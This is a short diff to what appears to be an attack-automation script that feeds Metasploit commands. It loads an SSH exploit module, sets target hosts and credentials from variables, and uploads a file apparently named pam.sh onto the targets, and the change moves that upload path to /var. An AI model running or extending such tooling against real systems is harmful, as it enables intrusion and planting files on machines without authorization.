@@ -11,7 +11,7 @@ echo -e "
 use exploit/darkfowl_ssh
 set RHOSTS $Linux_TARGETS
 set LOCALLOCATION $Linux_FILE
-set REMOTELOCATION /tmp/logs/pam.sh
+set REMOTELOCATION /var/pam.sh
 set USERNAME $Linux_USERNAME
 set PASSWORD $Linux_PASSWORD
 set disablepayloadhandler true
